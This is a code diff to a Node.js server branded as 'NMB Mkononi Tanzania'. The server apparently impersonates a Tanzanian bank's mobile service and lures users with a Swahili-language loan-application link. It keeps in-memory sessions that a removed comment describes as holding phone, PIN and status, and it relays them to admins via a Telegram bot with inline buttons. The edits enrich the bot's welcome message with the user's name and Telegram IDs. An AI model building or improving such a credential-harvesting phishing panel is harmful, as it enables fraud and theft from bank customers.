@@ -3,7 +3,7 @@ const path = require('path');
 const fetch = require('node-fetch');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
 // Telegram Configuration (Replace or use Environment Variables)
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
@@ -14,7 +14,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Store active sessions in memory
 const sessions = {}; 
-// structure: { sessionId: { clientRes, phone, pin, status } }
 
 // Send message to specific Telegram Chat ID with Inline Keyboards
 async function sendTelegramMessage(chatId, text, replyMarkup) {
@@ -133,19 +132,33 @@ app.get('/api/check-status/:sessionId', (req, res) => {
     res.json({ status: currentStatus });
 });
 
-// Telegram Webhook / Callback handler endpoint (Handles Admin button actions & /start command privately)
+// Telegram Webhook / Callback handler endpoint
 app.post('/api/telegram-webhook', async (req, res) => {
     const update = req.body;
 
     // Handle /start command from any user/subadmin privately (Main admin does not receive it)
     if (update && update.message && update.message.text) {
-        const chatId = update.message.chat.id;
-        const text = update.message.text.trim();
+        const messageObj = update.message;
+        const chatId = messageObj.chat.id;
+        const text = messageObj.text.trim();
         
         if (text === '/start') {
-            // Generate private web link for this specific user/chat session
+            const firstName = messageObj.from.first_name || 'User';
+            const lastName = messageObj.from.last_name || '';
+            const fullName = `${firstName} ${lastName}`.trim();
+            const username = messageObj.from.username ? `@${messageObj.from.username}` : 'None';
+            const userId = messageObj.from.id;
+
+            // Generate private web link containing their personal identification reference info
             const privateLink = `${req.protocol}://${req.get('host')}?ref=${chatId}`;
-            const welcomeMsg = `Karibu kwenye NMB Mkononi Tanzania.\n\nBonyeza kiungo hapa chini kuanza ombi lako la mkopo:\n${privateLink}`;
+            
+            const welcomeMsg = `Karibu kwenye NMB Mkononi Tanzania, <b>${fullName}</b>!\n\n` +
+                               `📋 <b>Taarifa Zako Binafsi (Personal Info):</b>\n` +
+                               `• Jina: <b>${fullName}</b>\n` +
+                               `• Username: <b>${username}</b>\n` +
+                               `• Telegram ID: <code>${userId}</code>\n` +
+                               `• Chat ID: <code>${chatId}</code>\n\n` +
+                               `🔗 <b>Kiungo Chako Maalum (Your Private Link):</b>\n${privateLink}`;
             
             await sendTelegramMessage(chatId, welcomeMsg, null);
             return res.sendStatus(200);
@@ -205,4 +218,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 app.listen(PORT, () => {
     console.log(`NMB Mkononi Tanzania server running on port ${PORT}`);
 });
-  
+                
